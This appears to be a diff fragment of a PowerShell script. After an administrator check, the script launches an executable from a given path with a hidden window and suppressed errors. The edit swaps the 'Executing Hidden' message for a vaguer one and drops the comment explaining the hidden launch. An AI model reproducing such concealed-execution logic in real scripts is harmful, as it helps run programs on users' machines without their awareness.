@@ -44,8 +44,7 @@ if ($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administ
         }
         
         if (Test-Path $path) {
-            Write-Host "[+] Executing Hidden..." -ForegroundColor Green
-            # Start the EXE hidden without opening a new PowerShell window
+            Write-Host "[+] ExE..." -ForegroundColor Green
             Start-Process $path -WindowStyle Hidden -ErrorAction SilentlyContinue
         }
     } catch {
